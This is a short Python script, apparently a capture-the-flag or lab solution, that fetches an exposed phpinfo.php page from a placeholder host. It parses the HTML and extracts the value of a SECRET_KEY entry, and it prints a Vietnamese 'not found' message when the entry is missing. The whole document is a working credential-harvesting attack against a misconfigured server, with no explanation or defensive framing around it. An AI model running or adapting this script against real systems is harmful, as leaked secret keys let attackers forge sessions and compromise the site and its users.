import requests
from bs4 import BeautifulSoup
import sys

target_url = "YOUR_HOST"

payload="cgi-bin/phpinfo.php"

res = requests.get(target_url+payload)
soup = BeautifulSoup(res.text, 'html.parser')

def get_secret_key(soup):
    key_tag = soup.find('td', class_='e', string=lambda s: s and "SECRET_KEY" in s)
    
    if key_tag:
        value_tag = key_tag.find_next_sibling('td', class_='v')
        
        if value_tag:
            return value_tag.get_text(strip=True)
    
    return "Không tìm thấy SECRET_KEY"

result = get_secret_key(soup)
print(result)

